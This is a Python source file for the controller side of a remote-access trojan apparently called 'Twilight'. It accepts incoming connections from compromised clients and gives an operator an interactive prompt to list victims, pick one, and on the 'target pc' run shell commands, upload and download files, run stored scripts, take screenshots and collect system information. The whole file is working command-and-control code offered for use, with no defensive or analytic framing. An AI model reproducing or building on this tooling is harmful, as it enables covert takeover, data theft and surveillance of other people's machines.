import socket
from termcolor import colored, cprint
import time
from queue import Queue
import threading
import re
import os
from prettytable import PrettyTable
from datetime import datetime
from server_utilities import *



NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connection = []
all_address = []
host = '127.0.0.1'
port = 5555
TIME_EXECUTION = 0

# ------------------------------------------------------------------------------
def socket_create():
    try:
        global s
        s = socket.socket()
    except socket.error as msg:
        print(colored("Error from socket_create", "yellow"))
        print("Socket creation error: " + msg)


def socket_bind():
    try:
        global s
        # print(colored("Binding socket to port " + str(port), 'yellow'))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket bind error" + str(msg))
        time.sleep(5)
        socket_bind()


def accept_connection():
    for c in all_connection:
        c.close()
    del all_connection[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept()
            conn.setblocking(1)
            all_connection.append(conn)
            all_address.append(address)
            print(
                colored(f"\n[+] Connection has been establish | IP {address[0]}", "green"))
            print(colored("Twilight> ", "blue"), end="")

        except:
            print(colored("Error accepting connections", "red"))

# Interacting prompt for sending commands remotely
def start_twilight():
    while True:
        cmd = input(colored('Twilight> ', "blue")).lower().split()
        if not cmd:
            continue
        if cmd[0] == 'list':

            list_connection()
            # continue
        elif cmd[0] == 'select':
            conn = get_target(cmd[1])
            if conn is not None:
                send_target_commands(conn)
        else:
            print("Command not recognized")


# Display all current connections
def list_connection():
    # results = ""
    results = []
    pretty_results = PrettyTable()
    for i, conn in enumerate(all_connection):
        try:
            # conn.send(" ".encode())
            reliable_send(s=conn, data=['whoami'])
            # conn.recv(20480)
            sys_info = reliable_receive(s=conn)

        except Exception as ex:
            del all_connection[i]
            del all_address[i]
            print(colored("Error from list connection", "red"))
            print(colored("ex", "yellow"))
            continue
        results.append([str(i), str(all_address[i][0]),
                       str(all_address[i][1])] + sys_info)

    pretty_results.field_names = [
        "Index", "IP Address", "Port", "User", "System", "Version"]
    for arr in results:
        pretty_results.add_row(arr)
    print('------Clients-----')
    print(pretty_results)


# select a target client
def get_target(target):
    try:
        target = int(target)
        conn = all_connection[target]
        user_connect = str(all_address[target][0])
        print(colored(f"You are now connected to {user_connect}", "green"))
        print(colored("Twilight> ", "blue"), end="")
        return conn
    except Exception as e:
        print(colored("Not a valid selection", "red"))
        # print(e)
        return None


def execute_command(conn, data):
    try:
        reliable_send(s=conn, data=data)
        client_response = reliable_receive(s=conn)
        # print(client_response, end="")
        return client_response
    except Exception as ex:
        print(colored("Error from execute_command function", "red"))
        print(colored(ex, "yellow"))
# clear screen
def clear_screen():
    if os.name == 'nt':  # For Windows
        _ = os.system('cls')
    else:  # For other platforms (Linux, macOS, etc.)
        _ = os.system('clear')

# remove extra space
def factory_input(input_string):
    if "\"" not in input_string:
        return input_string.split()
    else:
        result_list = re.findall(r'[^"\s]+|"(?:\\.|[^"])*"', input_string)
        result_list = [item.replace('"', '').strip() for item in result_list]
        return result_list

# is user add correct argument
def isCorrectArgument(command_user,command):
    correct_command = False

    if command_user == "upload":
        correct_command = len(command) == 3

    elif command_user == "download":
        correct_command = len(command) == 3

    elif command_user == "run":
        correct_command = len(command) == 2

    elif command_user == ["help", "h"]:
        correct_command = len(command) == 1

    elif command_user == ["quit", "exist"]:
        correct_command = len(command) == 1

    elif command_user == "show-script":
        correct_command = len(command) == 1
        
    elif command_user == "screen-shot":
        correct_command = len(command) == 1
        
    elif command_user == "sysinfo":
        correct_command = len(command) == 1
    else:
        correct_command = True

    return correct_command


# connect with remote target client
def send_target_commands(conn):
    location = "Bash$ "
    while True:
        try:

            command = factory_input(input())
            if not command:
                cprint(location, "red", attrs=["bold"], end="")
                continue

            command_user = command[0].lower()

            # is user add correct argument
            if not isCorrectArgument(command_user, command):
                
                print(colored("-----------Not Correct Argument !!!-----------", "red"))
                cprint(location, "red", attrs=["bold"], end="")
                continue
            
            # -------------commands----------------
            if command_user in ["help", "h"]:
                show_list_command()
                cprint(location, "red", attrs=["bold"], end="")
                continue

            if command_user in ['quit', 'exit']:
                break
            if command_user in ["clear" , "clr"]:
                clear_screen()
                cprint(location, "red", attrs=["bold"], end="")
                continue
            if command_user == "upload":
                file_content = read_file(command[1])
                command.append(file_content.decode())
                                

            if command_user == "run":
                files_script_dict = create_file_script()
                path_file = files_script_dict[command[1]]

                file_content = read_file(path_file)
                command.append(file_content.decode())

            if command_user == "show-script":
                print(showScript())
                cprint(location, "red", attrs=["bold"], end="")
                continue

            # ----------------------------------------------------------
            result_from_client = execute_command(conn=conn, data=command)
            # ----------------------------------------------------------

            if command_user == "whoami":
                print(result_from_client)
                cprint(location, "red", attrs=["bold"], end="")
                continue

            if command_user == "download" and "[Error]" not in result_from_client[0]:
                file_path = command[2]
                file_name = os.path.basename(command[1])
                file_path = os.path.join(file_path, file_name)

                result_from_client = [write_file(
                    path=file_path, content=result_from_client[0]), result_from_client[1]]
                
            if command_user == "screen-shot" and "[Error]" not in result_from_client[0]:
                screenshot_string = result_from_client[0]
                
                timestamp = datetime.now().strftime("%Y_%m_%d_%HH_%MM_%SS_")
                image_name = f"screenshot_{timestamp}.png"
                path = os.path.normpath(f"screenshot/{image_name}")
                
                result_from_client[0] = convert_string_to_image_and_save(screenshot_string, path) 
                

                
            

        except Exception as ex:
            print(colored("Connection was lost", "red"))
            print(colored(f"ERROR:\n {ex}", "yellow"))
            break

        cprint(f"The Command took [{TIME_EXECUTION:.3f}] seconds to complete.", "white")
        if command_user == "sysinfo":
            print_system_info_table(result_from_client[0])
        else:
            print(result_from_client[0])
        cprint(result_from_client[1], "red", attrs=["bold"], end="")
        location = result_from_client[1]

# Help
def show_list_command():
    table = PrettyTable()

    table.field_names = ["Command", "Description", "Example"]
    table.add_row(["help/h", "Show list of commands", "help/h"])
    table.add_row(["quit/exit", "to exit target pc", "quit/exit"])
    table.add_row(["upload", "Send file for target PC",
                  "upload [data.txt] [path_on_target_pc]"])
    table.add_row(["download", "Get file from target PC",
                  "download [data.txt] [path_on_your_pc]"])
    table.add_row(
        ["show-script", "show all script to run on target pc", "show-script"])
    table.add_row(["run", "run script on target pc", "run [script name]"])
    table.add_row(["screen-shot", "take screen shot on target pc", "screen-shot"])
    table.add_row(["sysinfo", "show brief information on target", "sysinfo"])

    table.align["Command"] = "l"
    table.align["Description"] = "l"
    table.align["Example"] = "l"
    print(table)

# Create worker threads
def create_worker():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()

# Do the next job in queue (one handle connection , second send commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            socket_create()
            socket_bind()
            accept_connection()
        if x == 2:
            start_twilight()
        queue.task_done()

# Each list item is a new job
def create_job():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()


create_worker()
create_job()
